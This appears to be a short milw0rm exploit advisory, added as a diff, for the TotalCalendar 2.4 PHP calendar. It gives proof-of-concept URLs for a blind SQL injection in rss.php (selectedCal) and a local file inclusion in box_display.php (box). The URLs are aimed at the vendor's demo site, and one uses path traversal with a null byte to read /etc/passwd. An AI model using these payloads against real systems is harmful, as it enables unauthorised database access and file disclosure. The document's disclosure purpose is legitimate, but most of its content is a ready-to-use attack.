@@ -1,0 +1,45 @@
+/*
+
+              _____       _ ___        __          
+             | ____|_   _(_) \ \      / /_ _ _   _ 
+             |  _| \ \ / / | |\ \ /\ / / _` | | | |
+             | |___ \ V /| | | \ V  V / (_| | |_| |
+             |_____| \_/ |_|_|  \_/\_/ \__,_|\__, |
+                                              |___/ 
+                                    _____                    
+                                   |_   _|__  __ _ _ __ ___  
+                                      | |/ _ \/ _` | '_ ` _ \ 
+                                      | |  __/ (_| | | | | | |
+                                      |_|\___|\__,_|_| |_| |_|
+
+TotalCalendar 2.4 (bSQL/LFI) Multiples Remote Vulnerability
+
+Discovered By : Moudi
+Contact : <m0udi@9.cn>
+Download : http://sweetphp.com/nuke/modules.php?name=Script_Preview&script=12
+
+Greetings : Mizoz, Zuka, str0ke, 599eme Man.
+Please visit: http://unkn0wn.ws/board/index.php
+
+*/
+
+[+] Exploit bSQL:
+
+- Vulnerable code in rss.php (selectedCal).
+
+- Poc:
+  http://127.0.0.1/rss.php?feedBox=Upcoming_Events&action=SwitchCal&selectedCal=[bSQL]
+
+  http://www.sweetphp.com/projects/TotalCalendar_2/rss.php?feedBox=Upcoming_Events&action=SwitchCal&selectedCal=1'+and+2-2='0 TRUE
+  http://www.sweetphp.com/projects/TotalCalendar_2/rss.php?feedBox=Upcoming_Events&action=SwitchCal&selectedCal=1'+and+2-2='1 FLASE
+
+[+] Exploit LFI:
+
+- Vulnerable code in box_display.php (box).
+
+- Poc:
+  http://127.0.0.1/box_display.php?box=[LFI]
+
+  http://www.sweetphp.com/projects/TotalCalendar_2/box_display.php?box=../../../../../../../../etc/passwd%00.htm
+
+# milw0rm.com [2009-08-26]
